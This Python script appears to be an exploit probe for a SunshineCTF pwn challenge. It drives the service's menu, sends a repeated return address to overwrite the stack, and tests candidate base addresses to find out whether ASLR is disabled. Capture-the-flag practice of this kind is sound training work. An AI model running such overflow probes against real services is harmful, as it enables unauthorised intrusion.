import sys, socket, struct, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

HOST, PORT = "sunshinectf.games", 26199
TARGET_OFF = 0x1aab          # start_position: prints the menu, then blocks on input


class R:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=10)
        self.buf = b""
        self.eof = False

    def pump(self, secs=0.3):
        self.s.settimeout(secs)
        try:
            while True:
                d = self.s.recv(8192)
                if not d:
                    self.eof = True
                    return
                self.buf += d
        except (socket.timeout, OSError):
            pass

    def say(self, data, secs=0.3):
        self.s.sendall(data + b"\n")
        self.pump(secs)


def probe(base, verbose=False):
    r = R()
    r.pump(1.0)
    if verbose:
        print("  intro:", r.buf[:120])
    for s in [b"42", b"1", b"1", b"addr", b"1", b"x", b"x", b"x", b"1", b"2", b"3"]:
        r.say(s)
    if verbose:
        print("  before pattern, tail:", r.buf[-260:])
    pat = struct.pack("<Q", base + TARGET_OFF) * 31
    if b"\n" in pat:
        print("base=0x%x: newline in pattern, skipped" % base)
        return False
    r.s.sendall(pat)
    r.pump(2.0)
    hit = b"1. Call Premium Cable Inc." in r.buf[-400:]
    print("base=0x%x -> pivot 0x%x menu_reprinted=%s" % (base, base+TARGET_OFF, hit))
    print("   tail:", r.buf[-240:])
    r.s.close()
    return hit


if __name__ == "__main__":
    for b in [0x555555554000, 0x0, 0x400000]:
        try:
            if probe(b, verbose=(b == 0x555555554000)):
                print("[!] ASLR off, base = 0x%x" % b)
                break
        except Exception as e:
            print("base=0x%x error %s: %s" % (b, type(e).__name__, e))
        time.sleep(0.8)
